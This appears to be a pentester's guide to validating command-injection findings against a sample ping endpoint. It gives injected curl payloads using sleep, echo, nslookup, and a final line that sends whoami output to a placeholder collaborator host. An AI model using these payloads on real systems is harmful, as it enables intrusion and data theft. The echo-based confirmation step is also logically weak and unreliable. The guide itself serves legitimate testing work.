# Command Injection False Positive Validation

## Common False Positives

### 1. Time Delay from Server Load, Not Injection
```bash
; sleep 5 → 5.2s response
```
The server might just be slow. Many non-injectable endpoints have variable latency.

**Confirm:** Run 3x baseline + 3x with payload:
```bash
# Baseline (no injection):
curl -X POST "https://target.com/ping" -d 'host=example.com'
# Times: 0.2s, 0.3s, 0.1s → avg 0.2s

# With sleep payload:
curl -X POST "https://target.com/ping" -d 'host=example.com; sleep 5'
# Times: 5.1s, 5.3s, 5.2s → avg 5.2s
# → CONFIRMED (26x baseline)

# With benign slow payload:
curl -X POST "https://target.com/ping" -d 'host=example.com; echo hello'
# Times: 0.2s, 0.3s, 0.2s → avg 0.23s
# If ALSO 5s → server is just slow sometimes
```

### 2. Output Reflection ≠ Execution
```bash
; echo HELLO → Response: "HELLO"
```
Could be:
- Command execution: `echo HELLO` ran on server 
- Argument echo: the app echoed back your input as a string 
- Error message: "Command not found: ; echo HELLO" 

**Confirm:**
```bash
; echo WORKED123 → Response: "WORKED123"
; echo FAILED456 → Response: "FAILED456"
# If response changes with your payload → executed by SHELL
```

### 3. OOB Only (DNS) Without Data
```bash
| nslookup COLLABORATOR
```
DNS query received but no command output. Server might do DNS resolution for logging.

## Confirmation Criteria

| Signal | Confident? |
|--------|------------|
| Consistent 5s+ delay vs baseline |  Strong |
| Command output changes with input |  Confirmed |
| OOB with data exfiltration |  Confirmed |
| Error messages revealing commands |  Strong |
| Single occurrence of delay |  Inconclusive |
| Output is identical to input (echo) |  False Positive |

## Validation Flow

```bash
# Step 1: Time-based confirmation
time curl -X POST "https://target.com/ping" -d 'host=127.0.0.1; sleep 3'
time curl -X POST "https://target.com/ping" -d 'host=127.0.0.1'
# Compare

# Step 2: Output-based confirmation
curl -X POST "https://target.com/ping" \
  -d 'host=127.0.0.1|echo UNIQUE_TOKEN_ABCDE'
# Search response for UNIQUE_TOKEN_ABCDE

# Step 3: OOB confirmation (if blind)
curl -X POST "https://target.com/ping" \
  -d 'host=127.0.0.1|curl http://COLLABORATOR/$(whoami)'
```
